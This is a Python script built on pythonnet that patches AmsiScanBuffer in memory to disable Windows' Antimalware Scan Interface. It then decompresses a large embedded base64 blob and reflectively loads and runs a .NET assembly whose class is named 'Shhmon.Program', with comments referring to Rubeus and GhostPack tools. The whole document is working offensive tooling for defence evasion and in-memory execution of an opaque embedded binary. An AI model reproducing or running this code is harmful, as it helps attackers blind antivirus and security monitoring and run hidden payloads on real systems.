import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "eJzte3t0HOd1353ZxewLWGIXxEMiSC7A1xIkQfAhiaRIiSAe5EoA8ViAD0kONFgMgCEXO6uZXQggTAXyK5KtOIrdYzdKYkWumlaJfRKniaTE7omVuj6uLbdy6tNWtaMjHdWqkyZy7focVz411d+9M7NYPGQzbf7pOR1y7nz38d17v/vd737f7C4G73uSAkQUxP3uu0Qvknudpl98LeOOb/+zOP1x5JttLyoD32wbmzWdVNG2Zmx9LpXTCwWrlJo0Una5kDILqd6hbGrOmjI66+qiOz0dw31EA0qAXvyjXbqv93Vqp5jSRXQYSNilvTYCkML9oOcdt1XXb6KVJ/2OS+crQKc/TFQv/1eelYdcT0DvELl6X6zZeJC1NxGLdVeq4rpcYeDnqvDOkrFQwvO/HHJlZazqOhUPdtqOnSPPN/hIGu6jq+VO43+nbeStnOfrsqfrxDq5M2vd/PKI+zwnXWqodx/au4kUklu7maFWX1u6AvQFVfom1I+bzQdvtdEspuNEUXuH32pObwJUm56yZ5iECYkeSDL6kI8evx9K0ri1A/X20up+SbrRuBUmmmpZVLMSoNUdG4adZCCdBNIQTAbTbWA11CRrUl94vYbSDazzAESaa8HbDp79E2i1NjP9cThuxxTPyGo/3mHekz4v3QhgNQGk3lU2UZLSCLi2G08koOZpTocAYkmlKd3MA9tu/yW629tUKoaewJwq6RbWdAvAsd9k7R2qp/3YE4xOA/U13bLWn/35/ztnWt/bmX0JOxJYbRrxvBWPE8/eePfd1+LJwI0mzMgWawto3w2f+Dx7ezzgeZPUkiGOvpbQ0q3cidmJkNt+hkV/DNGEBtLWdVF+9O8R5cTaMW157zF1yJASmoeMBT0LHfbvBddlZQec6G51l84c7hzS5RXccS+3r6S3QcrZzn6lIGSl2Lra1NHcsU3lfIOGhi6NPucuv4T9im+DMxbVQN1s76xBhImJ2oGYPVxT8ecTfjOp3GjE+NSkol1Po7AllZbre/mp3miMMF1tvr5f8ND1A/wMuPSmhqD9vK9EHWxKquEnmJ5ul4nEtNa5Rl9bMdqu+c1oUwfWbg3tULhuUsJBVKLRFNdVp5Gj/QgqdrS2qa4lZCEltJDVLDmWVNMYmFYXSV2j0PKR7aFEkNNDey+x/c2RVECBZBiL86+eR6Qi6V3QfE1zO6QTvKJRgKLhNSrSkSo723w77yG1f5NrpvPW91K/7+nXjjdo9hQiEFlJmoTm7GHxsAw3neYVFwqno5x+3w3thxbJfa0jUdNB3QNuXiC36GXc38MNI8hXUlSP/hZubKvU6OUQ0+EDBRDnzbijHr2hK0gfU2QfS6iu8b1sPGa/Ag+dDnbKnRM1FnolyvO6j4WQCdF/ymhtiLNTSx/gYpgM3mjEtKrhJWwvwebTH+M4vxJb3YtRFMhgomYJG0rQ6WTObokiSLdVSDuFFALtDtDEANq3o91yf/ogS6QqEserJI5VSXQxQCJqxz4CV1y3Wo5MRl6pXe0Tow2iS1s6WdGlLd25gTVt6a4qiVMbWdu3xf5PCJ9rb2WWnUOSEkihw5xoS5AP7k+G3IYojB37NEqexus5QN+EyzU8L5tHAptHHjnCRWN/CJvHUZ4PzbqNOzTVHnsacqHwU3VaRDgNQRhgXkNNU4O2byFRk9CeagglQnaRO9/O0/u+RDARcqXDibArHWlqiO47mYgkok81xBIx+0Mhb5/a35YIJ2KudG0gUWs/y5w7uFYi1tERNTKSiDZfaogmoonIx83DX0powFAvEzXAlsPNl2rDoY+bd1969913Ow6r6eNeqdU63lIdLl/XkWBBFWEaJpd5gok7mSgpeX0XN6XSqQGu4lrHli5V8llyu8lC9dReC6lcaqLf5Xqq1Ls5H4lQyD0fqISp4oNFQl1ie9GmmJZU0ney0hsNS3t4LmL28xiac5KniYnIymDta1EsQC19SjafFd0RSh9yl9Fuv3/HCbVZXFHTd3l1ne3eyfNz83aXdm1g1be5+6Brk/XyMSt883rdyFXr7aAN9V56T73iWlWJ2u5S0nczs2qqmm40XOfYqc1osCerrPo2ewd9mwH6fZ4r2Aw0HYoE1CWe+0Mp+214b98AcClPbKuspNPVUxQ4rHSQWu0d17ADDS4l4HQz6QwXXy2Q7ql4GfC9FDFfWTrGUWrbcDz2QpiKXql254QPu0OPUxtqrtKA2CHEPKjESqm0v44+6V5estiA+zgvtqlLPZwu7WrgujRA6PUJvR6hzyf0eYR+nyAN2DmTveeMIidm9/w9f7Szq/NI15FDx0kqRx5wGaPZ8QjR3+L5LFbHjmzJNgszDks8Caf/FhO9YzxL72933092nB3PwAN6AviXsCHvOJO3Jlf2EOXi3Z/dHuGF9VPlCDW553VUazmr9PNawL2HXHqf12529yaZbNVdg9JmmYB3hz1cJf/9Jam5I9MoV/PtqEavCPxa8LPRTdTOc0TfDd4W0ai/huEegS8I/KDA3xL4P0QmXvNXmkZXat8Jadgp/6dyJz3CWytNBJlCYYZ/EWFYC65G99W1gfv5IFtUiOmfCDB8PcCUF0QyJH2/ITrf0Rh+OsrwBOSj1Fr7WUgekr7/qO4ZwC+GGP44wPA3Qn8C7m+Lnl8ROCXanhMrD4n1VIjbvxb9LDzPikxGtF1Fm+NyWqLjzn89/TD0cuS2CvZSzMWCgu0jFwsJdkuUsR1oKbj/JuJimymKdL4T3bspTdsE+yqfS6nDw5LC2w+sTknQR8OMdXrYvxLsCG0X7L8LdgJYDfp8K8aZcDcw1vKfI8zrAXZheSk0pF5YnlQZ/guN4Z46hjtrGUYDDP9C6JeEko8KXXp1hBkOCGwVyR+KniPS/sMYw59GGD5KDC8K/KrC8DVpvy3wO0L5hrR3SHtI4K8L/AOhDwjMCSUv7d+V9lPSLqHdRj+rHQU8qY2rCiWjLyG294UuoX1RfZ+q0YI6CXgVXmm0qY6hJvDtWoYjsWno2S2juxNQq3+e6fWfYfn6UlV7h8qwXtonQlcAn65luEvaH5L2Z34eV/uvyjisfD48B3hF4EcBFfoT9SHA31TZ/2+oJcAPAA6nOMd+nbaGl0DZv4OxT1F7+FFVpbOCfaTlcWSySsMe7+HAh8EL73SxO2ofVQOrJAOStcv0qdQ+9WPqCtZc96QarGBH6n5LjVSwheA/U+MVbLruc+omD/tkqjb8R2qiwuuP/Zm6uYK9XfNv1FtXWd9KtZ5n2yN/qW6lx3a54/v3ke8AS+1xeWdrv6duW9UvRe/sqca0tI8pwE4L9hX6AFZqG2q98ML3hp5W2uhlD7tHnQfvPwj2lvJYkCW/7/LoUlQHdnqvi30Mda+N/rFgX4Hk36ntVMvlnh6lcfB20Lc7XD8fqh1RdtLPOlwLm4KDwGr2MfbBcEuwnnZSfJ/LGws8reyiJo+n4yVgF233eD+O/kjdTXs8nhr7KbAuj9eg/kjdQ8c83nb1p6pb25+NMawJU0qh24IMv8+nemQ+V/N7NBWV56TKn+u8JZ/JAOLFlWUCIhMUmRrIeFzAVwOswQhxO8LncXonpkIeVkD5pnAPiYZng6zhozHe4z4VVFEr58WftiDLdAZZ5rro/ExUBTwNGZUKAabgNRnQFkihlXbtBlCj9+FMwnOcIJ73WwCjtBewHpWd4XGB3QIzAkcEXhaoC3xO+pqSHd+ic8Hd9Cp9tXYfvUHX6rqw3yxFT6H6/sfaQfohPRcbBf252EV6h5K1DwB+JqCTojwXM0DP1V4RDUXIn6mbpz8lzqM3qDtwTei/TBHlzdqPUEJ5PPoE4H8LfBJ22Xqb8gntd2GL239N34u8BAopX2FK4Ou0F/LfBv0jdd8BvAZ4SJHRKV8M/BiSZvBnoJ+N1Cit0JBQ2pR8qFn5IT0Z3KrsFclaOqYmlIwyGjyuPENDdacAH4j1KG/Q1zCWZyignVNM+ok2qLxKW7URZUS5t25cuayMRnVFFw2Xla/Wziqmck2bhf5fDS0oD4H+AeWvJf5tyiOhx0BfDn0c8De0T4N+jJ5WIsiDzwGG6QuAtfQ8YD19EXAzfRmwhf41YCt9HTBF/w5wJ30bME2vAu6n1wC76E3Ao/R9wGP0d4An6UeAp+kngL30vwDP4cU6QgM42EfwjhIDHKN6wEvUCPgA3Qr4IG0HnKKdgLO0FzBPnYBFOgJYQoQitECnAN8vfZdFz4dEw2N0BvBFoXwJXE75zylhCioxtMNKvdpJMWoOdFIDpQC30N2AO+gc4D4aAzwi8E6BPQLvpfsAs9K+n+zA64Ec9FOQYUrgaYEPClwW+DsCvyxQDzN8VOAzAl8SGKJ74eWg2oj7QTqrTuKewj2Nexb3Fdx5yqgF3EXcNu4SaPN4LuC+hvv9uBvpKZz636B25X5lTnGU68onFT5txWWPGAoF8LishgB7gjFAI8CUltgmPpWqmwIqzpUBrOsWVAEV54kQcS0Ood2GVatQO6CKGMXQ3gmooubVob0bUMPcb6G3Qq+GXg7djnNrDKthE+3DHkc4vzTX8bOBjsizkRaCqCFKM03XcVG5hWrDKvAt1A+3Titb6e2aAAWX3fPrm9se8D5yeTlS9e0Arn+i/EAOtKtp7lkuBCpmmzifo7hjuGtx1+GOk3w9cL6cz+uTeePBQ5TpK5TnDNvDBkynhMegmbMtx5oudV40C0cO03imUMJjzHKfJwetqXLeuIvOIjuG7u07PzHa191L2bHu873do70To5mz58ayHrFvYng0cyEz0He2b6LvfPeZgb6NJEfGM6N9a6RH+waHLoDomujuvWc8OzaR7ctmM0Pn8V4xwC8XLm9kvG/08kR2aHy0p88j9Y4PD2R6usd8PDM43DeaHTrPlLNGqW8hZxRLplXot+xzo55MxXR2tc0qOhudgPMT3WNjo5kz42NrZc+ODo0PV2gDAxPdPT1wefXIxrN9vRP9Q6M+c5WG3r7+7vGBsQ0jN3HmcoXvdUI4zorrg92jl6vjQfN6vmxMTNCck7PsvDlJ2UWnZMx19lj5vJHjwTudZ42CYZs5mjFKE/22Pmdkpsipaveb+ZJhjxfylj5F3VNTNLlYMpxRo1S2C8aUdOs1naLlADGdSrPPti17qIi8YjPdk5ZdAnWgbE5RnsFJT/9dVycmzui5q3iL7DeNPBjd+ZJZKk8Z6znn0WM9NVNwSnohZzjrWNPier9Z8Nzpz5d84fNWqd8qVxhmfi0lX3IHvppcwTIOr6Ah++KsWTKyRT1nSCR83yWCFUT3G1mjNGZdNQrDtjkPkzMGB3RUL6CRcSPHq1A0ndMLU2iOlgslc84YWywaHgWpy1i/bc15FFHptWfdR8a5YOUReWlmCqMWGljIU9bDzpmyyWEQUg8SwPIMcnDFbWnki26qeIg83HBKEyOS50Ubwx8wCwYNWDk9P6jnZhm5wHnHXtJwyR6zsiW7nEO+GF4y8Yz05JEm5KULDes2Q9uYN62yky3pJYPOGw+7jR5rroiR2JKpIEx1l0q2OVkGq9eYLM/McNBWaN2OY8xN5hfHzNKGZFufMuZ0++oKa0y3EQFJyIetaobfB3GaNmfKXi6vY/caTs42i6uZrtfSY9TI6wvSctZ3HrZRSnOljYwWF21zZnZD1lxRLyyuMLw0EXrJnDTzZqmKO2BZV8vFStLJ7HAeuQ0pEpSdnZ2zCp3GgpsN7uwP6zNG1rxmkFkwS6ael/acvnCmPD1t2IJNrjT7Cg7m2OVlnKHpsVljlP0XZgGzyc9suVi0DcdBDuh5JowajtABhqZpaHoaOYiGV6nGZm1Dn8KKdtdfxho2Cito1rDnzZzRnWehRQShwCyvqxeTzguG7SD0zJFU5MaU5N2K2gKCYE5l5jDec7ozS4N6adZLVn8VDxiFmQqRk98jcLTOoCR66ORKM+8+/CUAa+MFk4auYsjd+byVO3c2b03qeeq3DcNvD2IhzOLpjSFr5MpYYoudmLxCziyC4y3jFYI+Na8XzSOHO6fyebpqoCrnPWQ6X0LRl+aw+2sGTy/xlk+zUjgIRRoFyUIBdVzCoG7itOV0T83hubZw+uHgLcTkuK4vrfpcFdcL4syMbcxg7Z7RHTOXKUxb9pwsiLV8rPjClG5PrRfpR729iY6DSFWXdRPCA8Byi+vFsTZcolNN9fPKmPY2T7KKEyjgprSHJq+A6u9/ldMFddszOF4VSkNlpLXU+vU83ktWqF42VjbPFY7oGDTmLHtxheiuXD9zVgZD9xm25S4vLpDuuvTz3QFm5kzY9ujuOvYCJeUYSL40ne92zIzDUXXLfxXRjZ5H7isw7OXx2SjhiOCwZQpNLJ7Rp3pRf4Dy0cs9cJYsmzpzDAexPPmJwyVWCxVxe8HuNfWZguWUzJyzdl1nWLtV9GrAOra/a1T4vFArZwXZ6Vaw8+W5ScMeml6huDsL1ixOuoyasjVj3VbKqIPN+0rZWbOjOzzAbHnyXmORFwKE/DLskHtocqtDpsBFwyE3/Ktp/Xl9xiFsSg71PVTW845/+Bi0bCODQTrunu/wBl7CanVoXQ735HXHQd1eQ5h6GJuVaWMPzfGCp1lv5bPXPWXbRkL4FLHplda+BbwWwNyskbtaGa9DF/X81VFjBjx7EQN2KnPdt2D0i2FvWUhQ/FOAW+PXlFc3DqtYHL9V5PPGAnIHtjwcXgEU5k3bKvAykin2RlE1IKpMTg/ObiVyFgu5Ucsq0TnsTkj1EjbIh+W5cjzpN22nhPGZpTEkk1Wu5rEbSNl5w23oC1JC3TmnqnDIAnRXa4XMJUPmFEWd25mC4WNeYc9MwWXGqe1+OkDvw1voIJmEjAUs0AxwnWw8HVJ6fIlxYDpoBp0AlqVZ/JsjC/KdoC3gTtFJ0MqglOj9dBW68vh3FykRn0oRn0pLvt7L0FHGswANBk2J7SloZk/YpxI80QEtPFNUhIwtXNdbtu+AznyfOy2yc0KdFUnWmQPmyisNWVoE1fW+F7LzRMsfvJ/2iUP94lBBXGEFhgx3pUMKHBuq5sVYCjdLFyqhexgt7sdyONHCdBkDLskQdehgfe203oV2om7fhzFQFisa3cH5oVvxqtqPTvlH9/ph7V3lI3uYhxZdRsU+sS433Adw90HKlrDx5C5RF10nJcbPE3QJbbrT92y93zxiXYJcbcXVfYL2IrTP/J+GVpew6RI+DmpZFKfoCB2j2+gw3Dv0cyfA7cm6CqLLWDMJ7kAR+IO+hy7lFw/pT/04n5e5We32dNUwb2YIncB7JBw5mWV3GNNeyq8O0NrB+vrZBxN9psUHQ5bberudpExsNBm/yIZTFZr3GtESRoJMGfcjs3ZiLUg5MgGWp6EoC1aXUbo5PimaTFnUJbHhZqmyy9eaAS8nkbElXqXqYpW9nzpEqht9pir+ZyE54E1i9boY9truWpgR264fDK9KFGnfzffm9et6yfKsoYwRrpe7ICMri73qtdhGyg5/dkZldIZnbUp0jmP0vUR7qkd5BXocmYmVWuF5Xind1XJjFf56v5z1/nSvrPubj6Eu0Xc10NVxWXKTwvfjy3KlqiIwLf1L3vpZvZp4ZH5J1ytFnOtUF7Ydv0Yd49wLFWW7oCxnybxE2ZTYbayD7S9KDqa8bFqJt18HK7p7stiqsohfHzbLB7Bey14O8krrEX0lqaF5iVUJMlkZAccmJ9Glhkwlsws+bfvqdbJWghLda1Ya3XEGLX+lpyobXF684dgvetXAwdgsQB4P9oZNvMU+DK9MusZ6FnvFA1P6cZQcj8OtWakOeaG7q3LG0+/PEs+dLj5fE4olXrj1JC+anXWSbg2hkY1ywl3tFkbtl2q3/vHhoiRxrt42Jqti0ClRLEndykmc2NMh4TsyF7im9jbV/dL47w9+eNPwP3/jhQevUjClKOFAipQaNBIJRuP1oXBLRG1MnFISxxLHwvF4kEBlEK4hVY3HtcbkcfDCKWKhBtJc2WCKGlihGmaADpS8DtUtjEXQMx5vBVTirSCqUKfGNQoABZWSyx/WYNt9qInlX42FahKpRGtiZ2JnBLLh1sZQyDWbbGmJRLxmRtVaakhJZsIR9G5MDrI3KdhIZtjVlpak36slkW7BcPYnusKQX/7txPIzIVJbW9CEZEtLuKYxcRkDhJoG/moi3hJms/GmUF1yZGs8HF8NA1pyBLLJkThGvRVAaY1jWPEAEQcpHA7XhAKtaljDgFvrebRKq1BagiG1VXC0lKRRw97GxYUWUFvCgZDSAs/YMdYYDr9w7YELtxx9/XH5BiL4ZiC0HPweA1UBeIG4xSAVBHiJW98KAXSrAAnavhxMMmhg0MjgSZbjH7sG+aexULqJ5AvYoMLq+Yc8QbYU5J/zBPm3RUH+NUHwNINl+SJEES568K+tg/y1jxJWNKVRCalaRNVaVS0c1LbrAtSAlkjhBjGEx1FVi2uaG2mEYCvHS+VWPQ8+Eo9RTSRxtCVSH6lviaLd4iLMa+HcaYmEKKCC1BInTW1R65EduOsjYZDj8fpECm67Ex4hyQfMPKKp1MfreZIUNcRJC/NhzhduBNLEt4o7Hkp7TMX7NdM2/mnOmNp00daL56s+IRibtfEKgWF7f4QRU0jzPh+QX88QNSuU3LnUXS7NWnblE0as+rMK3dp5vm+s8inofu9zs1P8OzAYi2+usPhDjrwu77f13CdV4aSOEv3xyMo3Uv/W/3uXDa4vj1RjEz2WjbdG+exJvq4wDPngiq93d1Hq9MZKNrxU+e0ZzC63EP8KVP6SpOpyf9d0bAM6X2uIFfnZ95B/Ebny5INE6cAKJx3gP265gHI+AdiHA0MWm8cQDqQTeJ7H8U7+Wof+ZfAHN/y/Unmg8c1t/vNuT0+wYmXl6hXaBTlY9Xtbe8bbQvnaKb3G5M2Mt6t81abqXn8YfEx+z+CWZfdwsl7TlMh0Vf4dRVnvIv5tOMeDN9U5Oavz1up4mtureEWxv4jRumd6/7pdvlv17bnbXE78KK7ys/otlq+TFK/qd0E2F6dKno/qXbjvoON43oHWbfD5dp5nQP7eNiO++m8c+SrPNnpj5use7BwKjlZ8eOIePLIixsTezqBHSeK9hENcWTY/3hTXy1wXXR0SmxVd7gzxoWFO5vJqJYqE93L2d8jTYXr++mMv/EK/3XkYlo1/ytt4187DaYnnapm1Uf15Me2V/t3eUWJODgx8uPn76PhajuhvqhL8B1/885N3L8zlU/Ne8Wk/1NnVnjIKOYs/9T/VPj7Wf+BYe8qRD3DzVsE41b5oOO1331UXrYue1L3vR1JQUXBOtZftwgknN2vM6c6BOf8b7QM5a+6E7sx1zh9qT83pBXPacEoXqu1BWSpVUeZ/ILPKJ/7Xniqg7J1qH1zsLhbzZk4+ZuvUi8X2g66Gkl12SvyZ3E36c9i1jJ6O97m/h4NiGw+V4acxtfJJ401qPdJe0VKtB8U2V2aPB4x5I5/KMzzVrjuZwrx11bDbU2XT/YzwVPu0nncMb1Ci5OAG3viuH1zl+8mDlSAAP3nQD+pd9A97Dbu/WX790D+w3v9//T9x/W9ehny+"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("Shhmon.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()